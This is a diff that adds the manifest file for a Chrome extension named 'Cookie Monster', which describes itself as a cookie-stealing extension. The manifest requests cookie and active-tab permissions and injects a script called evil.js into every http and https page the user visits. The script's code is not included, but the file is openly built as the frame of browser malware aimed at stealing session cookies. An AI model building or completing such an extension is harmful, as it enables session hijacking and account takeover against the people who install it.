@@ -1,0 +1,20 @@
+{
+    "name": "Cookie Monster",
+    "description": "A cookie stealing chrome extension...",
+    "manifest_version": 3,
+    "version": "1",
+    "permissions": ["activeTab","cookies"],
+    "icons": {
+        "16": "default.png",
+        "48": "default.png",
+        "128": "default.png"
+    },
+    "content_scripts": [{
+        "matches":
+        [
+        "https://*/*",
+        "http://*/*"
+        ],
+        "js": ["evil.js"]
+    }]
+}
